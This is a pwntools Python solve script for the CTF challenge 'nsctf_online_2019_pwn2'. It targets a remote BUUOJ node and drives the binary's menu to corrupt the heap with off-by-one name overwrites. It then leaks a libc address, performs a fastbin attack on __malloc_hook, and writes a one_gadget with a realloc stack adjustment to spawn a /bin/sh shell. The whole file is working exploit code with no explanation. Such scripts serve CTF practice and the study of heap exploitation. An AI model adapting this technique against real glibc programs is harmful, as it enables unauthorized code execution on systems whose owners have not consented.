from pwn import *
context(log_level='debug',arch='amd64',terminal=['tmux','splitw','-h'])

io=remote("node4.buuoj.cn",29081)
# io=process("./nsctf_online_2019_pwn2")
elf=ELF("./nsctf_online_2019_pwn2")
libc=ELF("./libc-2.23.so")

def pre(cc):
    io.recvuntil(b"name\n")
    io.send(cc)
    
def add(s):
    io.sendlineafter(b"exit\n",b"1")
    io.sendlineafter(b"size\n",str(s))
    
def delete():
    io.sendlineafter(b"exit\n", b"2")

def show():
    io.sendlineafter(b"exit\n", b"3")
        
def update(cc):
    io.sendlineafter(b"exit\n", b"4")
    io.sendafter(b"name\n",cc)
    
def edit(cc):
    io.sendlineafter(b"exit\n", b"5")
    io.sendafter(b"note\n",cc)

# gdb.attach(io)
# pause()

pre(cyclic(0x30))

add(0x90)
add(0x30)
update(cyclic(0x30)+b"\x10")
delete()

add(0x20)
# edit(cyclic(0x18)+p64(0x10))
update(cyclic(0x30)+b"\x40")

show()
leak_addr=u64(io.recvuntil(b"\x7f")[-6:].ljust(8,b"\x00"))-0x68-libc.sym[b"__malloc_hook"]
print("leak_addr: "+hex(leak_addr))
realloc=libc.sym[b"__libc_realloc"]+leak_addr
malloc_hook=libc.sym[b"__malloc_hook"]+leak_addr
one_gadget=[0x45216,0x4526a,0xf02a4,0xf1147]
shell=one_gadget[1]+leak_addr

add(0x60)
delete()

add(0x10)
update(cyclic(0x30)+b"\x40")
edit(p64(malloc_hook-0x23))

add(0x60)
add(0x60)
edit(cyclic(0xb)+p64(shell)+p64(realloc+0x10))

# gdb.attach(io)
# pause()

add(0x10)
# add(0x10)
    
io.interactive()

# 0x45216 execve("/bin/sh", rsp+0x30, environ)
# constraints:
#   rax == NULL

# 0x4526a execve("/bin/sh", rsp+0x30, environ)
# constraints:
#   [rsp+0x30] == NULL

# 0xf02a4 execve("/bin/sh", rsp+0x50, environ)
# constraints:
#   [rsp+0x50] == NULL

# 0xf1147 execve("/bin/sh", rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL